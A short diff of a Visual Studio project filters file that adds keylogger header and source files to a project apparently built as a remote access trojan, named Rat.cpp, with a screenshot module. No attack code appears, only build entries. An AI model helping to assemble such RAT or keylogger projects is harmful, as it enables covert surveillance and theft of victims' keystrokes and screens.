@@ -76,6 +76,8 @@
     <ClInclude Include="GdiPlusInitializer.h">
       <Filter>Screenshot</Filter>
     </ClInclude>
+    <ClInclude Include="KeyLoggerHandler.h" />
+    <ClInclude Include="KeyLoggerOwner.h" />
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="Rat.cpp">
@@ -126,6 +128,8 @@
     <ClCompile Include="GdiPlusInitializer.cpp">
       <Filter>Screenshot</Filter>
     </ClCompile>
+    <ClCompile Include="KeyLoggerHandler.cpp" />
+    <ClCompile Include="KeyLoggerOwner.cpp" />
   </ItemGroup>
   <ItemGroup>
     <None Include="packages.config" />
